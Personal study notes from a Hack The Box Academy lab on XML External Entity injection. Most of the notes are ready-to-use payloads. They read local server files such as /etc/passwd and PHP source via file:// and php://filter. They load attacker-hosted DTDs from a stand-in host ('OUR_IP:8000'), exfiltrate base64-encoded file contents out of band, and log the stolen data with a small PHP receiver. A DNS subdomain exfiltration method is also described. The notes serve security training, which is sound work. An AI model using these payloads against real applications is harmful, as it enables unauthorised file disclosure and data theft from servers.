---
htb:
  - https://academy.hackthebox.com/app/module/134/section/1203
---
[XML External Entity (XXE) Injection](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_\(XXE\)_Processing)

Many web applications process XML data as part of their functionality. Suppose a web application utilizes outdated XML libraries to parse and process XML input data from the front-end user. In that case, it may be possible to send malicious XML data to disclose local files stored on the back-end server.

DTD = Doc Type Definition, basically a file consisting of doctype parts
## payloads
Find a tag which's content is referenced in response body. Effectively exposing data.
Payloads use XML's ENTITY references to external files and protocols to expose data.
### basic XML injection payload
```xml
<!DOCTYPE whatever [
	<!ENTITY variable_name SYSTEM "file://exposed_file.txt">
	<!ENTITY php_filter SYSTEM "php://filter/convert.base64-encode/resource=exposed_file.php>
]>
(...)
<tag_exposing_data>&variable_name; or &php_filter;</tag_exposing_data>
```
### cdata payload
#oob
wrapping the content of an extenral file so the parser consider this part as raw data
```xml
<!DOCTYPE email [
	<!ENTITY % begin "<![CDATA[">
	<!ENTITY % file SYSTEM "file:///var/www/html/exposed_file.php">
	<!ENTITY % end "]]>">
	<!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
	%xxe;
]>
<tag_exposing_data>&joined;</tag_exposing_data>
```
requires storing a joining part in externaly hosted DTD:
```shellsession
user@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
user@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
## error based outputs
#oob 
when no exposing tag is available
first, probe the post with malformed XML if it outputs any errors
#### hosted dtd payload:
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM %nonExistingEntity;/%file;'>">
```
`%nonExistingEntity;` does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined `%file;` as part of the error.
#### call:
```xml
<!DOCTYPE email [
	<!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
	%remote;
	%error;
]>
```
## blind data exfiltration
#oob 
when no output at all
[[OOB Data Exfiltration]]
automated tool: [[XXEInjector]]

web application sends a web request to our web server with the content of the file we are reading

#### hosted example php parser (optional)
```php
<?php
	if(isset($_GET['content'])) {
		error_log("\n\n" . base64_decode($_GET['content']));
	}
?>
```
```shellsession
php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```
#### hosted payload (xxe.dtd)
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
#### method call payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
	<!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
	%remote;
	%oob;
]>
<root>&content;</root>
```
### DNS OOB Exfiltration
#oob 
Placing the encoded data as a sub-domain for our URL (e.g. `ENCODEDTEXT.our.website.com`), and then using a tool like `tcpdump` to capture any incoming traffic and decode the sub-domain string to get the data.